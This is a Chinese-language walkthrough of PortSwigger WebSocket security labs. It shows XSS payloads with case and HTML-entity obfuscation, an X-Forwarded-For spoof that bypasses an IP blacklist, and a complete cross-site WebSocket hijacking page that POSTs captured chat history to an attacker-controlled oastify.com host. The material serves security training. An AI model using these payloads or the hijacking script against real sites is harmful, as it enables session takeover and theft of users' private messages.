## WebSockets 安全漏洞

### 操控 WebSocket 消息以利用漏洞

实验：操控 WebSocket 消息以利用漏洞
https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities

使用基于WebSocket 的 chat功能
GET /chat HTTP/2
响应为
HTTP/1.1 101 Switching Protocol


```json
// 发送
{
    "message":"test"
}

// 返回
{
    "user":"You",
    "content":"test"
}
```

对应页面显示为
```html
<tr class="message">
    <th>You:</th>
    <td>test</td>
</tr>
```

控制数据为 message属性的值，
显示位置为 <td> 标签间

在拦截器中的message属性值中发送：
```javascript
// 注入script标签时，响应中包含，但未启用
<script>alert(1)</script>
// 注入img标签
<img src=1 onerror='alert(1)'>
```

### 操控 WebSocket 握手以利用漏洞

实验：操控 WebSocket 握手以利用漏洞
https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities


控制数据为 message属性的值，
显示位置为 <td> 标签间

在拦截器中的message属性值中发送：
```javascript
// 注入img标签 
<img src=none onerror='alert(1)'>
```
响应为 {"error":"Attack detected: JavaScript"}

此时再次访问chat功能时 
响应为 HTTP/2 401 Unauthorized
"This address is blacklisted"

拦截后，刷新chat页面，添加 X-Forwarded-For: 头部
成功连接
在burp的 代理-匹配和替换 功能中设置 X-Forwarded-For 头部，确保整个会话中头部均被修改

输入
```javascript 
// 使用大小写混淆事件处理器，使用html编码混淆JavaScript代码 alert(1)
<img/oNerRor='&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;'src=none >
```

示例解决方案
```javascript 
// 标签函数是一种以模板字符串作为参数的函数，通过在函数名后直接跟随模板字符串（如 tagFn``）调用。
// 第一个参数是普通字符的字符串数组（由嵌入表达式 分隔），第二个参数为 嵌入表达式的值的顺序数组。

// alert`1` 函数后接模板字符串，被解析为 alert(["1"], raw: ["1"])
// alert实现标准输出而 对数组 ["1"] 调用 toString，转为字符串 "1"
// 最终等效于 alert(1)
<img src=1 oNeRrOr=alert`1`>
```

### 跨站 WebSocket 劫持

实验：跨站 WebSocket 劫持
https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab




```html

<!DOCTYPE html>
<html>
<head>
    <title>WebSocket Test</title>
</head>
<body>
    <script>
        // 发送对 http 的 WebSocket 升级连接
        const socket = new WebSocket('wss://0a8d00b204bdaf7b83fa3ee300f5000e.web-security-academy.net/chat');
        // 握手成功后执行 onopen 回调函数
        socket.onopen = (event) => {
            console.log('build');
            // 观察浏览器与应用程序的 WebSocket 交互，建立连接后浏览器发送 READY到服务器，服务器返回历史记录
            socket.send('READY');
        };
        // WebSocket 收到信息后执行onmessage回调函数，使用 .data属性访问数据
        // 使用fetch post将数据发送到攻击者控制的服务器
        socket.onmessage = (event) => {
            console.log('rec:', event.data);
            fetch('https://pngqn8h00sbgbkwq8c3iv0k78yep2fq4.oastify.com', {
                method: 'POST',
                mode: 'no-cors',
                body: event.data
                });
        };
        socket.onclose = (event) => {
            console.log('close');
        };
    </script>
</body>
</html>


```

pngqn8h00sbgbkwq8c3iv0k78yep2fq4.oastify.com